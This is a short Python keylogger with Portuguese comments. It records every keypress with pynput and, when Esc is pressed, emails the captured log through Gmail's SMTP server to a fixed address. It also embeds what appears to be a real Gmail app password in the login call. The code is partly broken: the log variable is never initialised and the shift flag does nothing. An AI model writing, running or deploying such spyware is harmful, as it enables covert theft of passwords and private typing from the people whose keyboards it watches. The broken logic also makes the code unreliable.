from pynput.keyboard import Listener, Key
import smtplib
from email.message import EmailMessage
import os

shift_pressed = False
current_input = ""
EMAIL_SENDER = '@gmail.com'
EMAIL_PASSWORD = 'password'
EMAIL_RECEIVER = '@gmail.com'



## Funcao enviar conteúdo por email
def enviar_email(conteudo):
    msg = EmailMessage()
    msg.set_content(conteudo)
    msg['Subject'] = 'Log de teclas'
    msg['From'] = EMAIL_SENDER
    msg['To'] = EMAIL_RECEIVER

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smpt:
        smpt.login(EMAIL_SENDER, 'gxuu flsr vqvs cohb')
        smpt.send_message(msg)

## Funcao capturar teclas
def log_keystrokes(key):
    global log_data

    if key == Key.shift:
        shift_pressed = True
        return

    key_str = str(key).replace("'", "")

    ## Chama a funcao enviar email com 'esc'
    if key == Key.esc:
        print(log_data)
        enviar_email(log_data)
    
    # Formatar teclas
    if key == Key.enter:
        log_data += "\n[ENTER]\n"

    elif key == Key.backspace:
        log_data += "[APAGADO]"
    
    elif key == Key.tab:
        log_data += " [TAB]"

    elif key == Key.space:
        log_data += " "

    else:
        log_data += key_str


# Inicia o listener para capturar as teclas 
with Listener(on_press=log_keystrokes) as listener:
    listener.join()
